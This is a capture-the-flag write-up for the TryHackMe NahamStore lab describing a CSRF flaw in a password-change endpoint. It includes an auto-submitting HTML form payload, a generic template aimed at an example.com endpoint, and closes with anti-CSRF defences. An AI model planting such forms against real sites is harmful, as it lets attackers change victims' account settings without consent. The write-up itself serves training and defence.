# Challenge Name: NahamStore | Task 6
# Platform: TryHackMe
# Difficulty: Medium

## 1. Vulnerability Type
CSRF

## 2. Root Cause
The endpoint does not validate a CSRF token and relies solely on cookie-based authentication.

## 3. Attack Surface
Vulnerable URI: `http://nahamstore.thm/account/settings/password`

## 4. Exploit Method
An attacker hosts a malicious page that auto-submits a POST request to the victim’s account endpoint while the victim is authenticated.

## 5. Payload / Technique
Example of payload is:
```html
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```

## 6. Impact
User's password can be changed without user's intention or notice.

## 7. Reusable Pattern
Test all state-changing endpoints (POST, PUT, DELETE) for missing CSRF token validation when cookie-based authentication is used.
## 8. Key Takeaway
Implement anti-CSRF tokens (unpredictable, validated server-side), use SameSite cookies, and validate Origin/Referer headers.
